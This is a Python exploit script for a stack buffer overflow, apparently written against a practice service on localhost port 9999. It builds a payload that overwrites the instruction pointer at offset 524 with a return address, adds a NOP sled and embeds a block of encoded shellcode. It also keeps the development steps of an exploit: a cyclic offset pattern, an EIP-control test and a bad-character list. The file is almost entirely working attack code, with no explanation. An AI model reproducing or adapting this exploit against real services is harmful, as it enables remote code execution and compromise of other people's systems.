import socket 

total = 600
total_to_eip = 524

def main():
    conn = get_connection('127.0.0.1',9999)
    send_exploit(conn, get_final_payload())
    
def get_connection(ip: str, port:int) -> socket.socket:
    sock = None
    while sock is None:
        try:
            sock = socket.create_connection(((ip, port)))
        except ConnectionRefusedError:
            continue
    return sock

def get_shellcode() -> bytes:
    buf =  b""  # Change shellcode
    buf += b"\xdb\xc0\xd9\x74\x24\xf4\x5a\xbf\x16\xbc\x63\x12"
    buf += b"\x2b\xc9\xb1\x52\x83\xea\xfc\x31\x7a\x13\x03\x6c"
    buf += b"\xaf\x81\xe7\x6c\x27\xc7\x08\x8c\xb8\xa8\x81\x69"
    buf += b"\x89\xe8\xf6\xfa\xba\xd8\x7d\xae\x36\x92\xd0\x5a"
    buf += b"\xcc\xd6\xfc\x6d\x65\x5c\xdb\x40\x76\xcd\x1f\xc3"
    buf += b"\xf4\x0c\x4c\x23\xc4\xde\x81\x22\x01\x02\x6b\x76"
    buf += b"\xda\x48\xde\x66\x6f\x04\xe3\x0d\x23\x88\x63\xf2"
    buf += b"\xf4\xab\x42\xa5\x8f\xf5\x44\x44\x43\x8e\xcc\x5e"
    buf += b"\x80\xab\x87\xd5\x72\x47\x16\x3f\x4b\xa8\xb5\x7e"
    buf += b"\x63\x5b\xc7\x47\x44\x84\xb2\xb1\xb6\x39\xc5\x06"
    buf += b"\xc4\xe5\x40\x9c\x6e\x6d\xf2\x78\x8e\xa2\x65\x0b"
    buf += b"\x9c\x0f\xe1\x53\x81\x8e\x26\xe8\xbd\x1b\xc9\x3e"
    buf += b"\x34\x5f\xee\x9a\x1c\x3b\x8f\xbb\xf8\xea\xb0\xdb"
    buf += b"\xa2\x53\x15\x90\x4f\x87\x24\xfb\x07\x64\x05\x03"
    buf += b"\xd8\xe2\x1e\x70\xea\xad\xb4\x1e\x46\x25\x13\xd9"
    buf += b"\xa9\x1c\xe3\x75\x54\x9f\x14\x5c\x93\xcb\x44\xf6"
    buf += b"\x32\x74\x0f\x06\xba\xa1\x80\x56\x14\x1a\x61\x06"
    buf += b"\xd4\xca\x09\x4c\xdb\x35\x29\x6f\x31\x5e\xc0\x8a"
    buf += b"\xd2\x1e\x15\x94\x23\x89\x17\x94\x32\x15\x91\x72"
    buf += b"\x5e\xb5\xf7\x2d\xf7\x2c\x52\xa5\x66\xb0\x48\xc0"
    buf += b"\xa9\x3a\x7f\x35\x67\xcb\x0a\x25\x10\x3b\x41\x17"
    buf += b"\xb7\x44\x7f\x3f\x5b\xd6\xe4\xbf\x12\xcb\xb2\xe8"
    buf += b"\x73\x3d\xcb\x7c\x6e\x64\x65\x62\x73\xf0\x4e\x26"
    buf += b"\xa8\xc1\x51\xa7\x3d\x7d\x76\xb7\xfb\x7e\x32\xe3"
    buf += b"\x53\x29\xec\x5d\x12\x83\x5e\x37\xcc\x78\x09\xdf"
    buf += b"\x89\xb2\x8a\x99\x95\x9e\x7c\x45\x27\x77\x39\x7a"
    buf += b"\x88\x1f\xcd\x03\xf4\xbf\x32\xde\xbc\xa0\xd0\xca"
    buf += b"\xc8\x48\x4d\x9f\x70\x15\x6e\x4a\xb6\x20\xed\x7e"
    buf += b"\x47\xd7\xed\x0b\x42\x93\xa9\xe0\x3e\x8c\x5f\x06"
    buf += b"\xec\xad\x75"

    return buf

def get_final_payload() -> bytes:
    payload  = b'\x41' * total_to_eip
    payload += b'\x31\x17\x12\xf3' [::-1] #Little endian
    payload += b'\x90' * 16
    payload += get_shellcode()
    
    return payload

def get_test_payload_1() -> bytes:
    payload = b'\x41' * total

    return payload

def get_test_payload_2() -> bytes:
    payload = b'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9'
    
    return payload

def get_test_payload_3() -> bytes:
    payload = b'\x41' * total_to_eip + b'\x42' * 4

    return payload

def get_test_payload_4() -> bytes:
    badchars = (
    b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
    b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
    b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
    b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
    b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
    b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
    b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
    b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
    b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
    b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
    b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
    b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
    b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
    b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
    b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
    
    payload = b'\x41' * total_to_eip + b'\x42' * 4 + badchars

    return payload

def send_exploit(sock: socket.socket, buffer:bytes, read_response=False):
    sock.recv(1024)
    sock.send(buffer)
    print(f'[+] Sent {len(buffer)} bytes') 


if __name__ == '__main__':
    main()
